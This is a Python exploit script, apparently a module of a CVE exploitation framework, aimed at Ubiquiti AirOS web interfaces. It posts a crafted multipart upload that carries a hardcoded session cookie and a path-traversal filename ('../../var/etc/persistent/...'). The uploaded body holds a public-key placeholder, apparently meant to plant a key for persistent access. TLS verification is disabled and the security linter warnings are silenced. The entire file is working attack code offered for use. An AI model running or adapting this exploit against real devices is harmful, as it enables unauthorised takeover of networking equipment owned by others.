from datetime import datetime

import typer
import urllib
from urllib3.util.url import parse_url
from cveforge.core.commands.run import tcve_exploit
import requests


@tcve_exploit(
    name="39701",
    categories=["cgi", "webapps", "php", "airos"],
    date=datetime(year=2016, month=4, day=15),
)
def exploit(url: str = typer.Argument()):
    parsed_url = parse_url(url)
    if not parsed_url.host:
        return
    cookies: dict[str, str] = {}
    cookies["$Version"] = "0"
    cookies["AIROS_SESSIONID"] = "9192de9ba81691e3e4d869a7207ec80f"
    # cookies["$Path"] = "/"
    cookies["ui_language"] = "en_US"
    headers: dict[str, str] = {}
    headers["Content-Type"] = (
        "multipart/form-data; boundary=---------------------------72971515916103336881230390860"
    )
    headers["Content-Length"] = "773"
    headers["User-Agent"] = "Jakarta Commons-HttpClient/3.1"
    headers["Host"] = parsed_url.host

    payload = b"""
-----------------------------72971515916103336881230390860
Content-Disposition: form-data; name="keyfile"; filename="../../var/etc/persistent/flag.txt"
Content-Type: application/vnd.ms-publisher

{{Your Public Key HERE}}
-----------------------------72971515916103336881230390860--
"""
    # trunk-ignore(bandit/B113)
    # trunk-ignore(bandit/B501)
    response = requests.post(url, cookies=cookies, headers=headers, verify=False, timeout=10, data=payload)
    print(response.ok)
